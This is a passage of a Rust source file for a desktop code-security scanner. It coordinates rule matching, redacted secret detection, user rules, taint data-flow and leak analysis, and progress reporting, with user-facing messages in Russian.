use crate::baseline;
use crate::blame;
use crate::deps;
use crate::external::{self, Tool, ToolStatus};
use crate::git;
use crate::model::*;
use crate::osv::OsvClient;
use crate::rules;
use crate::secrets;
use crate::settings;
use crate::taint;
use crate::userrules;
use crate::walk::{self, WalkOptions};
use anyhow::{Context, Result};
use rayon::prelude::*;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Instant;
use tauri::{AppHandle, Emitter};

/// How many context lines surround the offending line in a finding's snippet.
const SNIPPET_CONTEXT: u32 = 3;

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ScanOptions {
    /// Local directory path, or a repository URL when `is_repo` is set.
    pub target: String,
    #[serde(default)]
    pub is_repo: bool,
    #[serde(default = "default_true")]
    pub respect_gitignore: bool,
    #[serde(default)]
    pub include_vendor: bool,
    #[serde(default = "default_true")]
    pub check_secrets: bool,
    #[serde(default = "default_true")]
    pub check_dependencies: bool,
    /// Experimental (BETA) heuristic pass: flags *suspected* issues the precise
    /// rules missed. On by default, but every such finding is clearly labelled.
    #[serde(default = "default_true")]
    pub experimental: bool,
    /// Data-flow (taint) analysis: traces user input through variables to a
    /// dangerous sink. The flagship own engine; on by default.
    #[serde(default = "default_true")]
    pub dataflow: bool,
    #[serde(default)]
    pub external_tools: Vec<Tool>,
}

fn default_true() -> bool {
    true
}

/// Maps a byte offset in a file to a 1-based line/column, and pulls snippets.
struct LineIndex<'a> {
    content: &'a str,
    /// Byte offset where each line starts.
    starts: Vec<usize>,
}

impl<'a> LineIndex<'a> {
    fn new(content: &'a str) -> LineIndex<'a> {
        let mut starts = vec![0usize];
        starts.extend(content.match_indices('\n').map(|(i, _)| i + 1));
        LineIndex { content, starts }
    }

    fn line_count(&self) -> u32 {
        self.starts.len() as u32
    }

    /// Returns 1-based (line, column).
    fn locate(&self, offset: usize) -> (u32, u32) {
        let line_idx = match self.starts.binary_search(&offset) {
            Ok(i) => i,
            Err(i) => i.saturating_sub(1),
        };
        let col = offset.saturating_sub(self.starts[line_idx]) + 1;
        ((line_idx + 1) as u32, col as u32)
    }

    fn line_text(&self, line: u32) -> &'a str {
        let idx = (line as usize).saturating_sub(1);
        let Some(&start) = self.starts.get(idx) else {
            return "";
        };
        let end = self
            .starts
            .get(idx + 1)
            .map(|&e| e.saturating_sub(1))
            .unwrap_or(self.content.len());
        self.content[start..end.max(start)].trim_end_matches('\r')
    }

    /// Byte offset where `line` (1-based) starts.
    fn line_start(&self, line: u32) -> usize {
        self.starts
            .get((line as usize).saturating_sub(1))
            .copied()
            .unwrap_or(0)
    }

    /// The text of `line` with the byte range `[value_start, value_end)`
    /// replaced by `mask`. Used so a credential never reaches the report.
    fn redacted_line(&self, line: u32, value_start: usize, value_end: usize, mask: &str) -> String {
        let text = self.line_text(line);
        let base = self.line_start(line);

        // Offsets are absolute in the file; rebase them onto the line, and bail
        // out to a fully masked line if anything looks off rather than risk
        // leaking the value.
        let (Some(s), Some(e)) = (value_start.checked_sub(base), value_end.checked_sub(base)) else {
            return mask.to_string();
        };
        if s > e || e > text.len() || !text.is_char_boundary(s) || !text.is_char_boundary(e) {
            return mask.to_string();
        }

        format!("{}{}{}", &text[..s], mask, &text[e..]).trim().to_string()
    }

    /// Snippet with surrounding context; returns the text and its first line number.
    fn snippet(&self, line: u32) -> (String, u32) {
        let first = line.saturating_sub(SNIPPET_CONTEXT).max(1);
        let last = (line + SNIPPET_CONTEXT).min(self.line_count());
        let text = (first..=last)
            .map(|l| self.line_text(l))
            .collect::<Vec<_>>()
            .join("\n");
        (text, first)
    }
}

/// Runs the user's own rules over a file.
///
/// Kept beside the built-in pass and sharing its comment/test-path suppression,
/// so a custom rule behaves exactly like a shipped one — a rule that fires
/// differently depending on who wrote it would be impossible to reason about.
fn scan_user_rules(
    content: &str,
    index: &LineIndex,
    rel: &str,
    lang: Language,
    user_rules: &[userrules::CompiledUserRule],
) -> Vec<Finding> {
    if user_rules.is_empty() {
        return Vec::new();
    }

    let in_tests = rules::path_is_test(rel);
    let mut out = Vec::new();

    for cr in user_rules {
        if !cr.applies_to(lang) {
            continue;
        }
        if in_tests && cr.rule.skip_in_tests {
            continue;
        }

        for m in cr.regex.find_iter(content) {
            let (line, column) = index.locate(m.start());
            let (end_line, end_column) = index.locate(m.end());
            let line_text = index.line_text(line);

            if !cr.rule.unless_contains.is_empty() {
                let hay = format!("{} {}", m.as_str(), line_text).to_ascii_lowercase();
                if cr
                    .rule
                    .unless_contains
                    .iter()
                    .any(|n| !n.is_empty() && hay.contains(&n.to_ascii_lowercase()))
                {
                    continue;
                }
            }

            if rules::is_comment_line(line_text, lang) {
                continue;
            }

            let (snippet, snippet_start_line) = index.snippet(line);
            out.push(Finding {
                id: format!("{}:{}:{}:{}", cr.rule.id, rel, line, column),
                fingerprint: String::new(),
                suppressed: false,
                suppression_reason: None,
                is_new: false,
                rule_id: cr.rule.id.clone(),
                title: cr.rule.title.clone(),
                description: cr.rule.description.clone(),
                recommendation: cr.rule.recommendation.clone(),
                severity: cr.rule.severity,
                confidence: cr.rule.confidence,
                source: FindingSource::Custom,
                source_label: FindingSource::Custom.label().to_string(),
                category: cr.rule.category.clone(),
                file: rel.to_string(),
                line,
                end_line,
                column,
                end_column,
                snippet,
                snippet_start_line,
                cwe: cr.rule.cwe.clone(),
                owasp: cr.rule.owasp.clone(),
                cve: Vec::new(),
                references: cr.rule.references.clone(),
                extra: None,
                package: None,
            });
        }
    }

    out
}

#[allow(clippy::too_many_arguments)]
fn scan_one_file(
    abs: &Path,
    rel: &str,
    lang: Language,
    check_secrets: bool,
    experimental: bool,
    dataflow: bool,
    user_rules: &[userrules::CompiledUserRule],
    max_findings: usize,
    externals: &std::collections::HashMap<String, taint::Summary>,
) -> Option<(Vec<Finding>, u32, u64)> {
    let bytes = std::fs::read(abs).ok()?;
    let size = bytes.len() as u64;
    // Files that survived the binary sniff can still be non-UTF-8 further in.
    let content = String::from_utf8(bytes).ok()?;
    let index = LineIndex::new(&content);
    let lines = index.line_count();

    let mut findings = Vec::new();

    for hit in rules::scan_content(&content, lang, rel) {
        let (line, column) = index.locate(hit.start);
        let (end_line, end_column) = index.locate(hit.end);
        let (snippet, snippet_start_line) = index.snippet(line);
        let rule = hit.rule;

        // Attach developer-facing detail and, if a corroborating sink is present
        // in the file, raise confidence a notch above the rule's baseline.
        let mut confidence = rule.confidence;
        let extra = rules::extra_for(rule.id).map(|ex| {
            let corroborated = ex.sink.is_some() && rules::sink_present(rule.id, &content);
            if corroborated && confidence == Confidence::Medium {
                confidence = Confidence::High;
            }
            FindingExtra {
                exploit: Some(ex.exploit.to_string()),
                impact: ex.impact.iter().map(|s| s.to_string()).collect(),
                fix_code: Some(ex.fix_code.to_string()),
                corroborated,
                experimental: false,
                ..Default::default()
            }
        });

        findings.push(Finding {
            id: format!("{}:{}:{}:{}", rule.id, rel, line, column),
            fingerprint: String::new(),
            suppressed: false,
            suppression_reason: None,
            is_new: false,
            rule_id: rule.id.to_string(),
            title: rule.title.to_string(),
            description: rule.description.to_string(),
            recommendation: rule.recommendation.to_string(),
            severity: rule.severity,
            confidence,
            source: FindingSource::Builtin,
            source_label: FindingSource::Builtin.label().to_string(),
            category: rule.category.to_string(),
            file: rel.to_string(),
            line,
            end_line,
            column,
            end_column,
            snippet,
            snippet_start_line,
            cwe: rule.cwe.iter().map(|s| s.to_string()).collect(),
            owasp: rule.owasp.map(|s| s.to_string()),
            cve: Vec::new(),
            references: rule.references.iter().map(|s| s.to_string()).collect(),
            extra,
            package: None,
        });
    }

    if check_secrets {
        for hit in secrets::scan_secrets(&content, rel) {
            let (line, column) = index.locate(hit.start);
            let (end_line, end_column) = index.locate(hit.end);
            let rule = hit.rule;
            // Replace the secret *inside* the line with its mask. Appending the
            // mask to the untouched line would leave the live credential in the
            // snippet, and therefore in the UI and in exported reports.
            let snippet = index.redacted_line(line, hit.value_start, hit.value_end, &hit.masked);

            findings.push(Finding {
                id: format!("{}:{}:{}:{}", rule.id, rel, line, column),
                fingerprint: String::new(),
                suppressed: false,
                suppression_reason: None,
                is_new: false,
                rule_id: rule.id.to_string(),
                title: rule.title.to_string(),
                description: rule.description.to_string(),
                recommendation: rule.recommendation.to_string(),
                severity: rule.severity,
                confidence: rule.confidence,
                source: FindingSource::Secrets,
                source_label: FindingSource::Secrets.label().to_string(),
                category: "Секрет в коде".to_string(),
                file: rel.to_string(),
                line,
                end_line,
                column,
                end_column,
                snippet,
                snippet_start_line: line,
                cwe: rule.cwe.iter().map(|s| s.to_string()).collect(),
                owasp: Some("A07:2021 – Identification and Authentication Failures".to_string()),
                cve: Vec::new(),
                references: Vec::new(),
                extra: None,
                package: None,
            });
        }
    }

    findings.extend(scan_user_rules(&content, &index, rel, lang, user_rules));

    // Experimental (BETA) heuristic pass. Fires only on lines the precise rules
    // and secrets left untouched, so it adds *suspected* issues rather than
    // duplicating confirmed ones.
    if experimental && rules::content_has_taint(&content) {
        let covered: std::collections::HashSet<u32> = findings.iter().map(|f| f.line).collect();
        let mut heur_count = 0;
        for line in 1..=lines {
            if heur_count >= 25 {
                // Cap per file so a pathological file can't flood the report.
                break;
            }
            if covered.contains(&line) {
                continue;
            }
            let text = index.line_text(line);
            if text.trim().is_empty() || rules::is_comment_line(text, lang) {
                continue;
            }
            // One heuristic finding per line is enough signal.
            let Some(h) = rules::line_heuristics(text, lang).into_iter().next() else {
                continue;
            };
            let column = text.len() as u32 - text.trim_start().len() as u32 + 1;
            let (snippet, snippet_start_line) = index.snippet(line);
            findings.push(Finding {
                id: format!("{}:{}:{}", h.id, rel, line),
                fingerprint: String::new(),
                suppressed: false,
                suppression_reason: None,
                is_new: false,
                rule_id: h.id.to_string(),
                title: h.title.to_string(),
                description: h.description.to_string(),
                recommendation: h.recommendation.to_string(),
                severity: h.severity,
                confidence: Confidence::Low,
                source: FindingSource::Builtin,
                source_label: FindingSource::Builtin.label().to_string(),
                category: h.category.to_string(),
                file: rel.to_string(),
                line,
                end_line: line,
                column,
                end_column: column,
                snippet,
                snippet_start_line,
                cwe: h.cwe.iter().map(|s| s.to_string()).collect(),
                owasp: Some(OWASP_INJECTION_STR.to_string()),
                cve: Vec::new(),
                references: Vec::new(),
                extra: Some(FindingExtra {
                    experimental: true,
                    ..Default::default()
                }),
                package: None,
            });
            heur_count += 1;
        }
    }

    // Data-flow (taint) pass — the flagship engine. Traces user input through
    // variables to a dangerous sink and reports the whole path. These are
    // confirmed findings (not BETA): every one carries a self-verifiable chain.
    if dataflow {
        for flow in taint::analyze_with(&content, lang, externals) {
            // Anchor at the deepest step still in this file: the sink for an
            // in-file flow, the call site for one that crosses into another file
            // (whose sink line means nothing in this file's line numbering).
            let anchor = flow
                .steps
                .iter()
                .rev()
                .find(|s| s.file.is_none())
                .or_else(|| flow.steps.last())
                .cloned()
                .unwrap_or(taint::FlowStep {
                    line: 0,
                    code: String::new(),
                    role: taint::FlowRole::Sink,
                    file: None,
                });
            let (snippet, snippet_start_line) = index.snippet(anchor.line);
            let crosses_file = flow.steps.iter().any(|s| s.file.is_some());
            // Where the untrusted data enters, so the source step and the
            // attack-paths panel name the real entry point, not "user input".
            let entry = flow.entry_kind();
            // A concrete attack input, its consequences, and how to break the
            // flow — specific to the category this path reached.
            let (exploit, impact, fix_code) = flow_advice(flow.category);
            let steps: Vec<CombineSpot> = flow
                .steps
                .iter()
                .map(|s| CombineSpot {
                    category: match s.role {
                        taint::FlowRole::Source => "Источник (пользовательский ввод)".to_string(),
                        taint::FlowRole::Propagation => "Передача через переменную".to_string(),
                        taint::FlowRole::Call => "Передача в функцию".to_string(),
                        taint::FlowRole::Sink => "Приёмник (опасный вызов)".to_string(),
                    },
                    line: s.line,
                    code: s.code.clone(),
                    file: s.file.clone(),
                })
                .collect();
            findings.push(Finding {
                id: format!("VS-FLOW:{}:{}:{}", rel, anchor.line, flow.category),
                fingerprint: String::new(),
                suppressed: false,
                suppression_reason: None,
                is_new: false,
                rule_id: "VS-FLOW".to_string(),
                title: if crosses_file {
                    "Пользовательские данные достигают опасного вызова в другом файле".to_string()
                } else {
                    "Пользовательские данные достигают опасного вызова".to_string()
                },
                description: if crosses_file {
                    "Анализ потока данных проследил значение от пользовательского ввода через вызов \
                     функции в другом файле до опасного вызова там — без экранирования или проверки \
                     по пути. Полный межфайловый путь показан в разделе «Поток данных»; каждый шаг, \
                     включая приёмник в другом файле, можно открыть в коде и проверить."
                        .to_string()
                } else {
                    "Анализ потока данных проследил значение от места, где в программу \
                     попадает пользовательский ввод, через присваивания переменных до опасного \
                     вызова — без экранирования или проверки по пути. Полный путь показан в разделе \
                     «Поток данных»; каждый шаг можно открыть в коде и проверить."
                        .to_string()
                },
                recommendation: "Разорвите поток: примените параметризацию, экранирование или белый \
                     список на одном из шагов между источником и приёмником — лучше как можно ближе \
                     к приёмнику."
                    .to_string(),
                severity: flow.severity,
                confidence: Confidence::Medium,
                source: FindingSource::Builtin,
                source_label: "Анализ потока данных".to_string(),
                category: flow.category.to_string(),
                file: rel.to_string(),
                line: anchor.line,
                end_line: anchor.line,
                column: 1,
                end_column: 1,
                snippet,
                snippet_start_line,
                cwe: flow.cwe.iter().map(|s| s.to_string()).collect(),
                owasp: Some(OWASP_INJECTION_STR.to_string()),
                cve: Vec::new(),
                references: Vec::new(),
                extra: Some(FindingExtra {
                    flow: steps,
                    entry: Some(entry.to_string()),
                    exploit,
                    impact,
                    fix_code,
                    ..Default::default()
                }),
                package: None,
            });
        }

        // Sensitive-data leakage — the other direction of data flow: a secret or
        // credential traced to a place it is exposed (a log, the response, an
        // outbound call). Reported as confirmed findings alongside injection.
        for flow in taint::analyze_leaks(&content, lang) {
            let sink = flow.steps.last().cloned().unwrap_or(taint::FlowStep {
                line: 0,
                code: String::new(),
                role: taint::FlowRole::Sink,
                file: None,
            });
            let (snippet, snippet_start_line) = index.snippet(sink.line);
            let steps: Vec<CombineSpot> = flow
                .steps
                .iter()
                .map(|s| CombineSpot {
                    category: match s.role {
                        taint::FlowRole::Source => "Источник: чувствительные данные".to_string(),
                        taint::FlowRole::Propagation => "Передача через переменную".to_string(),
                        taint::FlowRole::Call => "Передача в функцию".to_string(),
                        taint::FlowRole::Sink => "Приёмник: разглашение".to_string(),
                    },
                    line: s.line,
                    code: s.code.clone(),
                    file: s.file.clone(),
                })
                .collect();
            findings.push(Finding {
                id: format!("VS-LEAK:{}:{}", rel, sink.line),
                fingerprint: String::new(),
                suppressed: false,
                suppression_reason: None,
                is_new: false,
                rule_id: "VS-LEAK".to_string(),
                title: "Чувствительные данные попадают в лог или ответ".to_string(),
                description: "Анализ потока данных проследил секрет или учётные данные от места, \
                     где они читаются, до места, где они разглашаются — в журнал, в HTTP-ответ \
                     или во внешний запрос — без маскирования или хеширования по пути. Секреты в \
                     логах и ответах утекают в системы хранения логов и третьим лицам."
                    .to_string(),
                recommendation: "Не выводите секреты в логи и ответы. Маскируйте значение, логируйте \
                     только идентификатор, храните секреты в защищённом хранилище."
                    .to_string(),
                severity: flow.severity,
                confidence: Confidence::Medium,
                source: FindingSource::Builtin,
                source_label: "Анализ потока данных".to_string(),
                category: flow.category.to_string(),
                file: rel.to_string(),
                line: sink.line,
                end_line: sink.line,
                column: 1,
                end_column: 1,
                snippet,
                snippet_start_line,
                cwe: flow.cwe.iter().map(|s| s.to_string()).collect(),
                owasp: None,
                cve: Vec::new(),
                references: Vec::new(),
                extra: Some({
                    let (exploit, impact, fix_code) = flow_advice(flow.category);
                    FindingExtra { flow: steps, exploit, impact, fix_code, ..Default::default() }
                }),
                package: None,
            });
        }
    }

    // Combination pass (BETA): when several amplifying vectors co-occur in one
    // file, they form a likely exploit chain that is worse than any part alone.
    if experimental {
        if let Some(combo) = detect_combination(&findings, rel, &index) {
            findings.push(combo);
        }
    }

    findings.truncate(max_findings);
    Some((findings, lines, size))
}

/// Re-runs the single-file scan on demand after the user edits a file in the
/// catalogue, then assigns stable fingerprints so the caller can diff the result
/// against the previous findings and mark the ones that disappeared as fixed.
///
/// Covers only the engines that run per file — built-in rules, secrets, the
/// data-flow analysis and the user's own rules — not the external tools, which
/// need their binaries and a full run; the caller keeps those findings as they
/// were. Deterministic and fast: one file, no I/O beyond reading it back.
///
/// Every post-pass a full scan applies to a file's findings is applied here in
/// the same order, so the two paths are comparable: anything that differs
/// between them would surface to the user as a phantom fix or a phantom new
/// problem on a file they did not touch.
pub fn recheck_file(
    root: &Path,
    abs: &Path,
    rel: &str,
    check_secrets: bool,
    experimental: bool,
    dataflow: bool,
    max_findings: usize,
) -> Vec<Finding> {
    let lang = Language::from_path(abs);
    let compiled_user = match userrules::load() {
        Ok(rules) => userrules::compile(&rules).0,
        Err(_) => Vec::new(),
    };
    let findings = match scan_one_file(
        abs,
        rel,
        lang,
        check_secrets,
        experimental,
        dataflow,
        &compiled_user,
        max_findings,
        // A single-file re-check has no project-wide export map, so cross-file
        // flows are not re-derived here; the intra-file result still matches.
        &Default::default(),
    ) {
        Some((f, _, _)) => f,
        None => Vec::new(),
    };

    // The same collapse a full scan does, in the same order (merge, then
    // fingerprint). Without it two built-in rules firing on one line with a
    // shared CWE stay separate here but arrive merged from the scan, and the
    // caller's diff reports the difference as brand-new problems — on a file
    // that was not even edited.
    let mut findings = merge_duplicate_code_findings(findings);

    // Attribution too, so a re-check does not silently strip the author chip
    // from findings that survive. Freshly edited (unsaved-to-git) lines simply
    // come back unattributed.
    blame::annotate(root, &mut findings);

    for f in &mut findings {
        f.fingerprint = baseline::fingerprint(f);
    }

    // Combination findings are numbered in display order, as in a scan; one file
    // can only contribute one chain, but the id has to match the scan's shape.
    let mut combo_n = 0u32;
    for f in &mut findings {
        if f.rule_id == "VS-EXP-COMBO" {
            combo_n += 1;
            f.rule_id = format!("VS-EXP-COMBO-{combo_n}");
        }
    }

    // Suppressions still apply: without this a re-check would resurrect every
    // finding the user silenced in .vulnscope-ignore.
    let (ignores, _) = baseline::load_ignores(root);
    for f in &mut findings {
        if let Some(s) = baseline::match_suppression(f, &f.fingerprint.clone(), &ignores) {
            f.suppressed = true;
            f.suppression_reason = Some(s.reason.clone());
        }
    }

    findings
}

/// Synthesizes a single "dangerous combination" finding when a file holds two or
/// more distinct amplifying vectors (command injection, SSRF, path traversal,
/// deserialization, …). Groups the involved findings by category and lists the
/// lines, so the reviewer sees the chain at a glance.
fn detect_combination(findings: &[Finding], rel: &str, index: &LineIndex) -> Option<Finding> {
    use std::collections::{BTreeMap, BTreeSet};
    // category -> sorted, deduped line numbers
    let mut by_cat: BTreeMap<&str, Vec<u32>> = BTreeMap::new();
    // Aggregate the real CWE/OWASP of the linked issues, so the combination is
    // classified by what it actually chains rather than a generic tag.
    let mut cwes: BTreeSet<String> = BTreeSet::new();
    let mut owasps: BTreeSet<String> = BTreeSet::new();
    for f in findings {
        if f.extra.as_ref().map(|e| e.combination).unwrap_or(false) {
            continue; // never chain a combination into another combination
        }
        if rules::is_amplifying_category(&f.category) {
            let lines = by_cat.entry(f.category.as_str()).or_default();
            if !lines.contains(&f.line) {
                lines.push(f.line);
            }
            for c in &f.cwe {
                cwes.insert(c.clone());
            }
            if let Some(o) = &f.owasp {
                owasps.insert(o.clone());
            }
        }
    }
    if by_cat.len() < 2 {
        return None;
    }

    for lines in by_cat.values_mut() {
        lines.sort_unstable();
    }
    // Anchor on the earliest involved line.
    let anchor = by_cat.values().flatten().copied().min().unwrap_or(1);
    let (snippet, snippet_start_line) = index.snippet(anchor);

    // One spot per (category, line), carrying that line's source. Ordered by
    // line so the chain reads top-to-bottom.
    let mut combine_spots: Vec<CombineSpot> = by_cat
        .iter()
        .flat_map(|(cat, lines)| {
            lines.iter().map(move |&line| CombineSpot {
                category: cat.to_string(),
                line,
                code: index.line_text(line).trim().to_string(),
                file: None,
            })
        })
        .collect();
    combine_spots.sort_by_key(|s| s.line);

    // CWE-77 (command/chain) leads, then the real CWEs of the parts.
    let mut cwe_list = vec!["CWE-77".to_string()];
    cwe_list.extend(cwes);
    let owasp = if owasps.is_empty() {
        Some(OWASP_INJECTION_STR.to_string())
    } else {
        Some(owasps.into_iter().collect::<Vec<_>>().join(" · "))
    };

    // A recognised chain (SSRF → RCE, path traversal → deserialization, …) gets
    // a concrete title; otherwise the generic one.
    let present: Vec<&str> = by_cat.keys().copied().collect();
    let title = rules::named_chain_title(&present)
        .unwrap_or("Возможная опасная связка уязвимостей");

    Some(Finding {
        id: format!("VS-EXP-COMBO:{rel}:{anchor}"),
        fingerprint: String::new(),
        suppressed: false,
        suppression_reason: None,
        is_new: false,
        rule_id: "VS-EXP-COMBO".to_string(),
        title: title.to_string(),
        // Static (translatable) text; the specific vectors are in `combines`.
        description: "В этом файле пересекаются несколько потенциально опасных векторов (перечислены \
             в «Связанных местах»). По отдельности каждый требует ручной проверки, но вместе они \
             образуют вероятную цепочку эксплуатации: управляемые данные достигают одного вектора, а \
             через другой усиливаются до выполнения кода или утечки. Это эвристическая связка (BETA): \
             проверьте, связаны ли эти места одним потоком данных."
            .to_string(),
        recommendation: "Разберите поток данных между перечисленными местами. Устраните хотя бы одно \
             звено цепочки (параметризация, экранирование, белые списки), а лучше — каждое."
            .to_string(),
        severity: Severity::Critical,
        confidence: Confidence::Low,
        source: FindingSource::Builtin,
        source_label: FindingSource::Builtin.label().to_string(),
        category: "Опасная связка".to_string(),
        file: rel.to_string(),
        line: anchor,
        end_line: anchor,
        column: 1,
        end_column: 1,
        snippet,
        snippet_start_line,
        cwe: cwe_list,
        owasp,
        cve: Vec::new(),
        references: Vec::new(),
        extra: Some(FindingExtra {
            experimental: true,
            combination: true,
            combine_spots,
            ..Default::default()
        }),
        package: None,
    })
}

/// OWASP tag shared by the experimental injection heuristics.
const OWASP_INJECTION_STR: &str = "A03:2021 – Injection";

struct Progress {
    app: AppHandle,
    scan_id: String,
    started: Instant,
    processed: AtomicU32,
    total: AtomicU32,
    findings: AtomicU32,
    /// Critical+high among them — the number that changes what the user does.
    severe: AtomicU32,
    last_emit_ms: AtomicU64,
}

impl Progress {
    fn emit(&self, phase: ScanPhase, current_file: &str, force: bool) {
        let elapsed_ms = self.started.elapsed().as_millis() as u64;

        // Throttle: the UI cannot use more than ~15 updates/sec, and emitting per
        // file on a large repo costs more than the scan itself.
        if !force {
            let last = self.last_emit_ms.load(Ordering::Relaxed);
            if elapsed_ms.saturating_sub(last) < 66 {
                return;
            }
            self.last_emit_ms.store(elapsed_ms, Ordering::Relaxed);
        }

        let processed = self.processed.load(Ordering::Relaxed);
        let total = self.total.load(Ordering::Relaxed);
        let secs = elapsed_ms as f32 / 1000.0;
        let files_per_sec = if secs > 0.0 { processed as f32 / secs } else { 0.0 };

        // Only extrapolate once there is a real sample; a guess from 2 files is
        // worse than showing nothing.
        let eta_ms = if processed >= 20 && total > processed && files_per_sec > 0.0 {
            Some((((total - processed) as f32 / files_per_sec) * 1000.0) as u64)
        } else {
            None
        };

        let _ = self.app.emit(
            "scan-progress",
            ScanProgress {
                scan_id: self.scan_id.clone(),
                phase,
                phase_label: phase.label().to_string(),
                current_file: current_file.to_string(),
                processed,
                total,
                findings_so_far: self.findings.load(Ordering::Relaxed),
                severe_so_far: self.severe.load(Ordering::Relaxed),
                elapsed_ms,
                eta_ms,
                files_per_sec,
            },
        );
    }
}

fn now_iso() -> String {
    chrono::Utc::now().to_rfc3339()
}

pub async fn run_scan(
    app: AppHandle,
    scan_id: String,
    opts: ScanOptions,
    cancel: Arc<AtomicBool>,
    tool_statuses: Vec<ToolStatus>,
) -> Result<ScanReport> {
    let cfg = settings::load();
    let started = Instant::now();
    let started_at = now_iso();
    let mut warnings: Vec<String> = Vec::new();
    let mut engines: Vec<String> = vec!["Встроенные правила".to_string()];

    let progress = Progress {
        app: app.clone(),
        scan_id: scan_id.clone(),
        started,
        processed: AtomicU32::new(0),
        total: AtomicU32::new(0),
        findings: AtomicU32::new(0),
        severe: AtomicU32::new(0),
        last_emit_ms: AtomicU64::new(0),
    };

    progress.emit(ScanPhase::Preparing, "", true);

    // ---------------------------------------------------------- resolve target
    let mut cloned_path: Option<PathBuf> = None;
    let (root, target_label) = if opts.is_repo {
        progress.emit(ScanPhase::Cloning, &opts.target, true);
        let repo = git::parse_repo_url(&opts.target)?;
        let path = git::shallow_clone(&repo).await?;
        // Reclaim earlier clones now that this one has replaced them.
        git::purge_other_clones(&path);
        cloned_path = Some(path.clone());
        (path, repo.label())
    } else {
        let path = PathBuf::from(&opts.target);
        if !path.is_dir() {
            anyhow::bail!("каталог не найден: {}", opts.target);
        }
        let label = path
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| opts.target.clone());
        (path, label)
    };

    // Removes the clone if a later phase fails; disarmed once a report exists.
    let mut cleanup = CloneGuard(cloned_path.clone());

    if cancel.load(Ordering::Relaxed) {
        progress.emit(ScanPhase::Cancelled, "", true);
        return Ok(cancelled_report(scan_id, &root, target_label, started_at, started));
    }

    // -------------------------------------------------------------- discovery
    progress.emit(ScanPhase::Discovering, "", true);
    let walk_opts = WalkOptions {
        respect_gitignore: opts.respect_gitignore,
        include_vendor: opts.include_vendor,
        follow_symlinks: false,
        // Sanitised on save, so these are safe to trust here.
        max_file_size: cfg.max_file_size_mb as u64 * 1024 * 1024,
        minified_line_len: cfg.minified_line_len as usize,
    };
    let discovery = {
        let root = root.clone();
        tokio::task::spawn_blocking(move || walk::discover(&root, &walk_opts))
            .await
            .context("обход файлов прерван")?
    };

    // A broken user rule must not sink the scan: skip it, warn, keep going.
    let (compiled_user, mut rule_warnings) = match userrules::load() {
        Ok(rules) => {
            let (compiled, warns) = userrules::compile(&rules);
            if !compiled.is_empty() {
                engines.push(format!("Свои правила ({})", compiled.len()));
            }
            (compiled, warns)
        }
        Err(e) => (Vec::new(), vec![format!("Свои правила не загружены: {e}")]),
    };
    warnings.append(&mut rule_warnings);

    progress.total.store(discovery.candidates.len() as u32, Ordering::Relaxed);
    progress.emit(ScanPhase::ScanningCode, "", true);

    // --------------------------------------------------------- scan the files
    let check_secrets = opts.check_secrets;
    let experimental = opts.experimental;
    let dataflow = opts.dataflow;
    let lines_total = AtomicU64::new(0);
    let bytes_total = AtomicU64::new(0);

    // ------------------------------------------ cross-file data-flow pre-pass
    // The flagship's cross-file layer: before scanning, collect each file's
    // exported function summaries (which parameter reaches a sink / is returned).
    // A call in one file can then resolve to a function in another. Only names
    // defined in exactly one file across the project are kept, so a collision
    // can never fabricate a false cross-file flow. Gated on `dataflow`, and only
    // the languages the engine can segment contribute.
    let externals: std::collections::HashMap<String, taint::Summary> = if dataflow {
        let per_file: Vec<(String, taint::Summary)> = tokio::task::block_in_place(|| {
            discovery
                .candidates
                .par_iter()
                .filter(|c| !cancel.load(Ordering::Relaxed) && taint::scoped(c.language))
                .flat_map_iter(|c| {
                    std::fs::read(&c.abs_path)
                        .ok()
                        .and_then(|b| String::from_utf8(b).ok())
                        .map(|content| taint::collect_exports(&content, c.language, &c.rel_path))
                        .unwrap_or_default()
                })
                .collect()
        });
        let mut counts: std::collections::HashMap<&str, u32> = Default::default();
        for (name, _) in &per_file {
            *counts.entry(name.as_str()).or_default() += 1;
        }
        per_file
            .iter()
            .filter(|(n, _)| counts.get(n.as_str()) == Some(&1))
            .map(|(n, s)| (n.clone(), s.clone()))
            .collect()
    } else {
        Default::default()
    };

    let max_findings = cfg.max_findings_per_file as usize;
    let scan_results: Vec<(String, Language, Vec<Finding>, u32, u64)> = {
        let candidates = &discovery.candidates;
        let cancel = cancel.clone();
        let externals = &externals;

        tokio::task::block_in_place(|| {
            candidates
                .par_iter()
                .filter_map(|c| {
                    if cancel.load(Ordering::Relaxed) {
                        return None;
                    }

                    let out = scan_one_file(
                        &c.abs_path,
                        &c.rel_path,
                        c.language,
                        check_secrets,
                        experimental,
                        dataflow,
                        &compiled_user,
                        max_findings,
                        externals,
                    );

                    progress.processed.fetch_add(1, Ordering::Relaxed);
                    match out {
                        Some((findings, lines, size)) => {
                            progress
                                .findings
                                .fetch_add(findings.len() as u32, Ordering::Relaxed);
                            // Severe hits are counted separately so the progress
                            // screen can say *what* is turning up, not just how
                            // much: "already 3 critical" is the number a person
                            // reacts to while the scan is still running.
                            let severe = findings
                                .iter()
                                .filter(|f| {
                                    matches!(f.severity, Severity::Critical | Severity::High)
                                        && !f.extra.as_ref().map(|e| e.experimental).unwrap_or(false)
                                })
                                .count() as u32;
                            if severe > 0 {
                                progress.severe.fetch_add(severe, Ordering::Relaxed);
                            }
                            lines_total.fetch_add(lines as u64, Ordering::Relaxed);
                            bytes_total.fetch_add(size, Ordering::Relaxed);
                            progress.emit(ScanPhase::ScanningCode, &c.rel_path, false);
                            Some((c.rel_path.clone(), c.language, findings, lines, size))
                        }
                        None => {
                            progress.emit(ScanPhase::ScanningCode, &c.rel_path, false);
                            None
                        }
                    }
                })
                .collect()
        })
    };

    if cancel.load(Ordering::Relaxed) {
        progress.emit(ScanPhase::Cancelled, "", true);
        return Ok(cancelled_report(scan_id, &root, target_label, started_at, started));
    }

    let mut findings: Vec<Finding> = Vec::new();
    let mut files: Vec<FileSummary> = Vec::new();
    let mut lang_files: std::collections::HashMap<Language, (u32, u64)> = Default::default();

    for (rel_path, language, file_findings, lines, size) in scan_results {
        let mut counts = SeverityCounts::default();
        for f in &file_findings {
            counts.add(f.severity);
        }
        let max_severity = file_findings.iter().map(|f| f.severity).max();

        let entry = lang_files.entry(language).or_insert((0, 0));
        entry.0 += 1;
        entry.1 += lines as u64;

        files.push(FileSummary {
            path: rel_path,
            language,
            language_label: language.label().to_string(),
            size,
            lines,
            counts,
            max_severity,
        });
